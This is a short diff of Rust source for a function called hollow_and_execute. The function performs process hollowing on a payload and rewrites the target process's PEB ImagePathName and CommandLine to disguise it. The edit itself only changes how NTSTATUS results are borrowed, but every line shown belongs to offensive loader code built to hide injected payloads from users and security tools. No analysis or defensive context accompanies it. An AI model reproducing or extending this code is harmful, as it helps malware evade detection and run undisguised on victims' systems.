@@ -870,10 +870,10 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                             16u64,
                             &mut us_written as *mut _ as u64,
                         );
-                        if write_img.unwrap_or(-1) < 0 {
+                        if write_img.as_ref().map(|r| *r).unwrap_or(-1) < 0 {
                             tracing::warn!(
                                 "hollow_and_execute: failed to update ImagePathName, \
-                                 NTSTATUS {:#010x}", write_img.unwrap_or(-1) as u32);
+                                 NTSTATUS {:#010x}", write_img.as_ref().map(|r| *r).unwrap_or(-1) as u32);
                         }
 
                         // Update CommandLine at RTL_USER_PROCESS_PARAMETERS +0x70.
@@ -886,13 +886,13 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                             16u64,
                             &mut cl_written as *mut _ as u64,
                         );
-                        if write_cmd.unwrap_or(-1) < 0 {
+                        if write_cmd.as_ref().map(|r| *r).unwrap_or(-1) < 0 {
                             tracing::warn!(
                                 "hollow_and_execute: failed to update CommandLine, \
-                                 NTSTATUS {:#010x}", write_cmd.unwrap_or(-1) as u32);
+                                 NTSTATUS {:#010x}", write_cmd.as_ref().map(|r| *r).unwrap_or(-1) as u32);
                         }
 
-                        if write_img.unwrap_or(-1) >= 0 && write_cmd.unwrap_or(-1) >= 0 {
+                        if write_img.as_ref().map(|r| *r).unwrap_or(-1) >= 0 && write_cmd.as_ref().map(|r| *r).unwrap_or(-1) >= 0 {
                             tracing::debug!(
                                 "hollow_and_execute: updated PEB ProcessParameters \
                                  ImagePathName/CommandLine to {}",
